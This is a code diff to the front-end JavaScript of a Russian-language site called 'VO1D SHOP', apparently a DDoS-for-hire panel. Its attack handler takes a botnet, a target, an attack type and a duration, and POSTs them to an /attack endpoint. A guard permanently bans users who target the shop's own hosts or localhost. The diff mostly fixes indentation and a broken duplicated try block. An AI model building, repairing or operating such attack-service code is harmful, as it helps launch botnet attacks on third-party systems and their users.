@@ -1385,83 +1385,81 @@ async function renderShop() {
             }
 
             window.handleStartAttack = async function() {
-                const botnetId = parseInt($('attackBotnet').value);
-                const target = $('attackTarget').value.trim();
-                const attackType = $('attackType').value;
-                const duration = parseInt($('durationSlider').value);
+    const botnetId = parseInt($('attackBotnet').value);
+    const target = $('attackTarget').value.trim();
+    const attackType = $('attackType').value;
+    const duration = parseInt($('durationSlider').value);
 
-                if (!botnetId) {
-                    showModal('Ошибка', 'Выберите активный ботнет');
-                    return;
-                }
-                if (!target) {
-    showModal('Ошибка', 'Введите цель');
-    return;
-}
+    if (!botnetId) {
+        showModal('Ошибка', 'Выберите активный ботнет');
+        return;
+    }
+    if (!target) {
+        showModal('Ошибка', 'Введите цель');
+        return;
+    }
 
-// ===== ПРОВЕРКА: НЕЛЬЗЯ АТАКОВАТЬ СВОЙ САЙТ =====
-const currentHost = window.location.hostname;
-if (target.includes(currentHost) ||
-    target.includes('vo1d-shop') ||
-    target.includes('railway.app') ||
-    target.includes('localhost') ||
-    target.includes('127.0.0.1')) {
+    // ===== ПРОВЕРКА: НЕЛЬЗЯ АТАКОВАТЬ СВОЙ САЙТ =====
+    const currentHost = window.location.hostname;
+    if (target.includes(currentHost) ||
+        target.includes('vo1d-shop') ||
+        target.includes('railway.app') ||
+        target.includes('localhost') ||
+        target.includes('127.0.0.1')) {
 
-    showModal(
-        '🚫 ДОСТУП ЗАБЛОКИРОВАН',
-        `
-        <div style="text-align:center; padding:10px;">
-            <div style="font-size:64px; margin-bottom:12px;">🔒</div>
-            <p style="font-size:20px; font-weight:700; color:var(--accent-red);">
-                ВЫ ЗАБЛОКИРОВАНЫ!
-            </p>
-            <p style="margin:12px 0; padding:16px; background:var(--bg-surface-2); border-radius:var(--radius-sm);">
-                Попытка атаки на собственный сервис VO1D SHOP зафиксирована.
-            </p>
-            <p style="color:var(--text-secondary); font-size:14px;">
-                🚫 Ваш аккаунт заблокирован навсегда.<br>
-                🔒 Доступ к системе закрыт.
-            </p>
-        </div>
-        `,
-        [],
-        '🚫'
-    );
+        showModal(
+            '🚫 ДОСТУП ЗАБЛОКИРОВАН',
+            `
+            <div style="text-align:center; padding:10px;">
+                <div style="font-size:64px; margin-bottom:12px;">🔒</div>
+                <p style="font-size:20px; font-weight:700; color:var(--accent-red);">
+                    ВЫ ЗАБЛОКИРОВАНЫ!
+                </p>
+                <p style="margin:12px 0; padding:16px; background:var(--bg-surface-2); border-radius:var(--radius-sm);">
+                    Попытка атаки на собственный сервис VO1D SHOP зафиксирована.
+                </p>
+                <p style="color:var(--text-secondary); font-size:14px;">
+                    🚫 Ваш аккаунт заблокирован навсегда.<br>
+                    🔒 Доступ к системе закрыт.
+                </p>
+            </div>
+            `,
+            [],
+            '🚫'
+        );
 
+        try {
+            await apiFetch('/admin/ban/' + currentUser.id, { method: 'POST' });
+        } catch(e) {}
+
+        localStorage.removeItem(TOKEN_KEY);
+        localStorage.removeItem(USER_KEY);
+        currentUser = null;
+        setTimeout(() => { navigateTo('home'); }, 2000);
+        return;
+    }
+
+    // ===== ЗАПУСК АТАКИ =====
     try {
-        await apiFetch('/admin/ban/' + currentUser.id, { method: 'POST' });
-    } catch(e) {}
-
-    localStorage.removeItem(TOKEN_KEY);
-    localStorage.removeItem(USER_KEY);
-    currentUser = null;
-    setTimeout(() => { navigateTo('home'); }, 2000);
-    return;
-}
-
-try {
-    const res = await apiFetch('/attack', {
-
-                try {
-                    const res = await apiFetch('/attack', {
-                        method: 'POST',
-                        body: JSON.stringify({ botnet_id: botnetId, target, attack_type: attackType, duration })
-                    });
-                    if (res.error) {
-                        showModal('Ошибка запуска', res.error);
-                        return;
-                    }
-                    if (res.success) {
-                        activeAttackId = res.attack_id;
-                        $('startAttackBtn').disabled = true;
-                        $('stopAttackBtn').disabled = false;
-                        addLogLine(`🚀 Атака запущена на ${target} (ID: ${res.attack_id})`);
-                        startAttackMonitoring(activeAttackId);
-                    }
-                } catch(e) {
-                    showModal('Ошибка', 'Сервер недоступен');
-                }
-            };
+        const res = await apiFetch('/attack', {
+            method: 'POST',
+            body: JSON.stringify({ botnet_id: botnetId, target, attack_type: attackType, duration })
+        });
+        if (res.error) {
+            showModal('Ошибка запуска', res.error);
+            return;
+        }
+        if (res.success) {
+            activeAttackId = res.attack_id;
+            $('startAttackBtn').disabled = true;
+            $('stopAttackBtn').disabled = false;
+            addLogLine(`🚀 Атака запущена на ${target} (ID: ${res.attack_id})`);
+            startAttackMonitoring(activeAttackId);
+        }
+    } catch(e) {
+        showModal('Ошибка', 'Сервер недоступен');
+    }
+};           
 
             window.handleStopAttack = async function() {
                 if (!activeAttackId) return;
